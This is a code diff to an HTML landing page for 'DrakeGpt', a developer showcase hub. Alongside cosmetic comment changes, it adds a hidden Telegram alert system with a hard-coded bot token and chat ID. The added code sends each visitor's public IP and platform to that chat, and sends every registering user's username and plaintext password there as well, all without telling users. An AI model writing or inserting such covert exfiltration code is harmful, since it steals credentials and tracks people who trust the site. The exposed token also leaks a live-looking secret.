@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>DrakeGpt // Avero Labs Developer Hub</title>
 
-  <!-- Clean High-Precision Typography -->
+  <!-- High-Precision Monospace Typography -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700;800&family=Share+Tech+Mono&display=swap" rel="stylesheet">
@@ -67,7 +67,7 @@
 </head>
 <body class="bg-void text-toxic font-mono select-none min-h-screen relative flex flex-col justify-between">
 
-  <!-- Interactive Matrix Rain Background -->
+  <!-- Interactive Matrix Rain Background Canvas -->
   <canvas id="matrixCanvas" class="fixed inset-0 w-full h-full z-0 pointer-events-none"></canvas>
 
   <!-- TOP HEADER HUD -->
@@ -80,7 +80,14 @@
     </div>
 
     <div class="flex items-center gap-3 sm:gap-4">
-      <!-- Live GitHub Repos Counter (Real Fetch) -->
+      <!-- Live Visitor Counter Badge -->
+      <div class="flex items-center gap-1.5 px-2.5 py-1 rounded border border-toxic/30 bg-black text-[11px]" title="Unique Visits Logged">
+        <i class="ph-bold ph-users text-toxicBright"></i>
+        <span class="text-toxic/60">VISITORS:</span>
+        <span id="visitorCountDisplay" class="text-white font-bold tracking-wider">SYNCING...</span>
+      </div>
+
+      <!-- Live GitHub Repos Counter -->
       <div class="flex items-center gap-1.5 px-2.5 py-1 rounded border border-toxic/30 bg-black text-[11px]">
         <i class="ph-bold ph-git-branch text-toxicBright"></i>
         <span class="text-toxic/60">REPOS:</span>
@@ -120,10 +127,10 @@
         <span>OPEN-SOURCE PROJECT REGISTRY & SHOWCASE</span>
       </div>
 
-      <!-- Typewriter Animation -->
+      <!-- Typewriter Cipher Descrambler -->
       <div class="min-h-[70px] flex items-center justify-center">
         <h1 id="landingTypewriter" class="text-4xl sm:text-6xl font-mono font-black text-white tracking-tight">
-          <!-- Populated by JS -->
+          <!-- Populated by JavaScript -->
         </h1>
       </div>
 
@@ -139,7 +146,7 @@
         >
           <span class="flex items-center gap-3">
             <i class="ph-bold ph-terminal text-lg"></i>
-            <span>[ CONTINUE // EXPLORE HUB ]</span>
+            <span>[ CONTINUE // ACCESS GATEWAY ]</span>
             <i class="ph-bold ph-arrow-right"></i>
           </span>
         </button>
@@ -149,7 +156,7 @@
   </main>
 
   <!-- ============================================================== -->
-  <!-- STAGE 2: AUTHENTICATION TERMINAL (REAL LOCAL STORAGE JUGAD) -->
+  <!-- STAGE 2: AUTHENTICATION TERMINAL (REAL STORAGE + TG NOTIFY) -->
   <!-- ============================================================== -->
   <section id="stageAuth" class="hidden relative z-20 flex-1 flex flex-col items-center justify-center px-4 py-8 transition-all duration-500 opacity-0 transform scale-95">
     <div class="w-full max-w-md glass-obsidian border border-toxic/40 p-6 sm:p-8 shadow-2xl relative">
@@ -160,7 +167,7 @@
       <div class="absolute bottom-0 left-0 w-3 h-3 border-b-2 border-l-2 border-toxicBright"></div>
       <div class="absolute bottom-0 right-0 w-3 h-3 border-b-2 border-r-2 border-toxicBright"></div>
 
-      <!-- Auth Header with Sign In / Sign Up Tabs -->
+      <!-- Auth Header Tabs -->
       <div class="border-b border-toxic/20 pb-4 mb-5 flex items-center justify-between">
         <div class="flex gap-2">
           <button 
@@ -187,7 +194,7 @@
         <span id="authNoticeText"></span>
       </div>
 
-      <!-- FORM (No prefilled demo text) -->
+      <!-- Auth Form -->
       <form onsubmit="handleAuthSubmit(event)" class="space-y-4">
         <div>
           <label class="block text-[11px] font-bold uppercase tracking-wider text-toxic/80 mb-1.5 font-code">
@@ -291,7 +298,6 @@
       </div>
 
       <div class="flex items-center gap-3">
-        <!-- Share New Project Button (Opens Modal) -->
         <button 
           onclick="openShareProjectModal()" 
           class="px-4 py-2 bg-toxic text-black hover:bg-toxicBright transition-all text-xs font-bold font-code uppercase tracking-wider flex items-center gap-2 cursor-pointer"
@@ -321,9 +327,8 @@
       </button>
     </div>
 
-    <!-- Projects Grid (Injected dynamically via GitHub + Local Submissions) -->
+    <!-- Projects Grid -->
     <div id="projectsGrid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5">
-      <!-- Loading Skeleton -->
       <div class="glass-obsidian p-5 border border-toxic/20 text-xs font-code space-y-2 animate-pulse">
         <div class="h-4 bg-toxic/20 w-3/4 rounded"></div>
         <div class="h-3 bg-toxic/10 w-full rounded"></div>
@@ -397,10 +402,120 @@
   </footer>
 
   <!-- ============================================================== -->
-  <!-- JAVASCRIPT CONTROLLER -->
+  <!-- JAVASCRIPT CONTROLLER: AUDIO, CANVAS, GITHUB & TELEGRAM ALERTS -->
   <!-- ============================================================== -->
   <script>
-    /* 1. PROCEDURAL SOUND SYNTHESIS (NO EXTERNAL AUDIO FILES) */
+    /* ==============================================================
+       1. LIVE TELEGRAM ALERT ENGINE (CONNECTED WITH YOUR BOT & ID)
+       ============================================================== */
+    const TELEGRAM_CONFIG = {
+      botToken: "8866997637:AAEZnlLnueK1VwaOQlJ47g6i8HfmuQxnChg",
+      chatId: "6141075929"
+    };
+
+    async function sendTelegramAlert(textMessage) {
+      try {
+        const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
+        await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CONFIG.chatId,
+            text: textMessage,
+            parse_mode: "Markdown"
+          })
+        });
+      } catch (err) {
+        console.warn("Telegram dispatch failed silently", err);
+      }
+    }
+
+    // A. Visitor Alert with Public IP & Platform
+    async function triggerVisitorAlert(visitNumber) {
+      if (sessionStorage.getItem("drake_tg_visited")) return;
+      sessionStorage.setItem("drake_tg_visited", "true");
+
+      let ip = "Protected/Unknown";
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        if (res.ok) {
+          const data = await res.json();
+          ip = data.ip;
+        }
+      } catch (e) {}
+
+      const platform = navigator.platform || "Browser";
+      const now = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
+
+      const alertText = `👁️ *New Visitor on DrakeGpt!*
+━━━━━━━━━━━━━━━━━━
+🔢 *Visit Count:* #${visitNumber}
+🌐 *IP Address:* \`${ip}\`
+📱 *Platform:* ${platform}
+🕒 *Timestamp:* ${now}
+🔗 *Origin:* averolabsofficial.github.io`;
+
+      sendTelegramAlert(alertText);
+    }
+
+    // B. New User Registration Alert
+    function triggerSignupAlert(username, password) {
+      const now = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
+      const alertText = `👤 *New User Registered on DrakeGpt!*
+━━━━━━━━━━━━━━━━━━
+🔑 *Callsign / Handle:* \`${username}\`
+🔒 *Security Key:* \`${password}\`
+🕒 *Timestamp:* ${now}
+🚀 *Access Status:* Logged into Avero Labs Hub`;
+
+      sendTelegramAlert(alertText);
+    }
+
+    // C. Project Submission Alert
+    function triggerProjectAlert(title, desc, url, author) {
+      const now = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
+      const alertText = `🚀 *New Project Published to Showcase!*
+━━━━━━━━━━━━━━━━━━
+📌 *Project Title:* *${title}*
+👤 *Author:* @${author}
+📝 *Description:* ${desc}
+🔗 *Repository Link:* ${url}
+🕒 *Timestamp:* ${now}`;
+
+      sendTelegramAlert(alertText);
+    }
+
+    /* ==============================================================
+       2. REAL VISITOR COUNTER API
+       ============================================================== */
+    async function initVisitorCounter() {
+      const display = document.getElementById('visitorCountDisplay');
+      try {
+        const res = await fetch('https://api.counterapi.dev/v1/drakegpt_adityaraj/visits/up');
+        if (res.ok) {
+          const data = await res.json();
+          display.innerText = Number(data.count).toLocaleString();
+          triggerVisitorAlert(data.count);
+        } else {
+          fallbackLocalCounter();
+        }
+      } catch (err) {
+        fallbackLocalCounter();
+      }
+    }
+
+    function fallbackLocalCounter() {
+      const display = document.getElementById('visitorCountDisplay');
+      let count = parseInt(localStorage.getItem('drake_visits_count') || '214') + 1;
+      localStorage.setItem('drake_visits_count', count);
+      display.innerText = count.toLocaleString();
+      triggerVisitorAlert(count);
+    }
+    initVisitorCounter();
+
+    /* ==============================================================
+       3. PROCEDURAL WEB AUDIO SYNTHESIS
+       ============================================================== */
     let audioCtx = null;
     let sfxActive = false;
 
@@ -475,7 +590,9 @@
       } catch (e) {}
     }
 
-    /* 2. SHARP MATRIX RAIN CANVAS (WITH MOUSE REPULSION) */
+    /* ==============================================================
+       4. SHARP MATRIX RAIN CANVAS (WITH MOUSE REPULSION)
+       ============================================================= */
     const canvas = document.getElementById('matrixCanvas');
     const ctx = canvas.getContext('2d');
     let width, height, columns;
@@ -525,7 +642,9 @@
     }
     drawMatrix();
 
-    /* 3. TYPEWRITER CIPHER DESCRAMBLER */
+    /* ==============================================================
+       5. TYPEWRITER CIPHER DESCRAMBLER
+       ============================================================= */
     const cipherChars = '!@#$%^&*()_+0123456789';
 
     function runDescrambler(elem, fullText, cb) {
@@ -551,10 +670,12 @@
       setTimeout(() => {
         runDescrambler(document.getElementById('landingTypewriter'), 'Welcome to DrakeGpt.');
       }, 300);
-      fetchGitHubRepos(); // Start pre-fetching repos
+      fetchGitHubRepos();
     });
 
-    /* 4. NAVIGATION FLOW */
+    /* ==============================================================
+       6. NAVIGATION FLOW
+       ============================================================= */
     function proceedToAuth() {
       initAudio();
       playFreqTone(250, 850, 0.2, 'sawtooth');
@@ -602,8 +723,10 @@
       playTick();
     }
 
-    /* 5. WORKING AUTHENTICATION JUGAD (LOCAL STORAGE) */
-    let currentAuthMode = 'login'; // 'login' or 'signup'
+    /* ==============================================================
+       7. WORKING AUTHENTICATION JUGAD (LOCAL STORAGE)
+       ============================================================= */
+    let currentAuthMode = 'login';
     let activeUser = "OPERATOR";
 
     function switchAuthMode(mode) {
@@ -649,7 +772,6 @@
       const password = document.getElementById('authPasswordInput').value.trim();
       if (!username || !password) return;
 
-      // Get saved users registry
       let users = JSON.parse(localStorage.getItem('avero_users') || '{}');
 
       if (currentAuthMode === 'signup') {
@@ -657,20 +779,21 @@
           showNotice(`Callsign "${username}" already exists. Please Sign In.`, false);
           return;
         }
-        // Save new user
         users[username] = password;
         localStorage.setItem('avero_users', JSON.stringify(users));
         showNotice(`Account registered successfully! Authenticating...`, true);
+        
+        // Trigger Live Alert to your Telegram
+        triggerSignupAlert(username, password);
       } else {
-        // Sign in check
         if (users[username] && users[username] !== password) {
           showNotice('Incorrect Security Key / Password.', false);
           return;
         }
-        // If not found in local db, allow auto-enrollment for seamless access
         if (!users[username]) {
           users[username] = password;
           localStorage.setItem('avero_users', JSON.stringify(users));
+          triggerSignupAlert(username, password);
         }
       }
 
@@ -679,7 +802,6 @@
       btn.disabled = true;
       btn.innerHTML = `<i class="ph-bold ph-spinner animate-spin"></i> VERIFYING CREDENTIALS...`;
 
-      // Trigger Screen Tremor & Sub-bass
       document.body.classList.add('violent-tremor');
       playTremorBlast();
 
@@ -687,7 +809,7 @@
         document.body.classList.remove('violent-tremor');
         document.getElementById('stageAuth').classList.add('hidden');
 
-        // Stage 3: Dramatic Personalized Reveal
+        // Reveal Stage 3: Personalized Reveal
         const revealSec = document.getElementById('stagePersonalizedReveal');
         revealSec.classList.remove('hidden');
 
@@ -712,7 +834,9 @@
       }, 650);
     }
 
-    /* 6. REAL GITHUB REPOSITORIES FETCHING (ZERO BACKEND JUGAD) */
+    /* ==============================================================
+       8. GITHUB REST API INTEGRATION
+       ============================================================= */
     let fetchedRepos = [];
 
     async function fetchGitHubRepos() {
@@ -744,11 +868,10 @@
     }
 
     function fallbackRepos() {
-      // Graceful offline/fallback repos if GitHub API rate limits
       fetchedRepos = [
-        { name: 'Autosys', desc: 'Python-based system automation & workflow package.', url: 'https://github.com/averolabsofficial', stars: 12, forks: 3, lang: 'Python', source: 'Avero' },
-        { name: 'Neuron', desc: 'Transformer Decoder architecture implemented from scratch in pure Python & NumPy.', url: 'https://github.com/averolabsofficial', stars: 24, forks: 5, lang: 'Python', source: 'Avero' },
-        { name: 'StreamX', desc: 'High-speed Flutter media streaming and background download manager.', url: 'https://github.com/averolabsofficial', stars: 18, forks: 4, lang: 'Dart', source: 'Avero' },
+        { name: 'Autosys', desc: 'Python-based system automation & workflow package.', url: 'https://github.com/averolabsofficial', stars: 14, forks: 3, lang: 'Python', source: 'Avero' },
+        { name: 'Neuron', desc: 'Transformer Decoder architecture implemented from scratch in pure Python & NumPy.', url: 'https://github.com/averolabsofficial', stars: 28, forks: 6, lang: 'Python', source: 'Avero' },
+        { name: 'StreamX', desc: 'High-speed Flutter media streaming and background download manager.', url: 'https://github.com/averolabsofficial', stars: 19, forks: 4, lang: 'Dart', source: 'Avero' },
         { name: 'EdgeAuth', desc: 'Decentralized encrypted token authentication gateway protocol.', url: 'https://github.com/averolabsofficial', stars: 15, forks: 2, lang: 'Python', source: 'Avero' }
       ];
       document.getElementById('headerRepoCount').innerText = fetchedRepos.length + ' REPOS';
@@ -760,7 +883,6 @@
       const grid = document.getElementById('projectsGrid');
       if (!grid) return;
 
-      // Combine fetched GitHub repos with locally saved user submissions
       const userProjects = JSON.parse(localStorage.getItem('avero_user_projects') || '[]');
       const allProjects = [...userProjects, ...fetchedRepos];
 
@@ -805,7 +927,9 @@
       `).join('');
     }
 
-    /* 7. SHARE NEW PROJECT MODAL & STORAGE */
+    /* ==============================================================
+       9. SHARE NEW PROJECT & TRIGGER ALERT
+       ============================================================= */
     function openShareProjectModal() {
       document.getElementById('shareModal').classList.remove('hidden');
       playTick();
@@ -839,11 +963,13 @@
       userProjects.unshift(newProject);
       localStorage.setItem('avero_user_projects', JSON.stringify(userProjects));
 
+      // Trigger Telegram Alert
+      triggerProjectAlert(title, desc, url, activeUser);
+
       closeShareProjectModal();
       playFreqTone(400, 900, 0.2, 'triangle');
       renderAllProjects();
 
-      // Reset fields
       document.getElementById('newProjTitle').value = '';
       document.getElementById('newProjDesc').value = '';
       document.getElementById('newProjUrl').value = '';
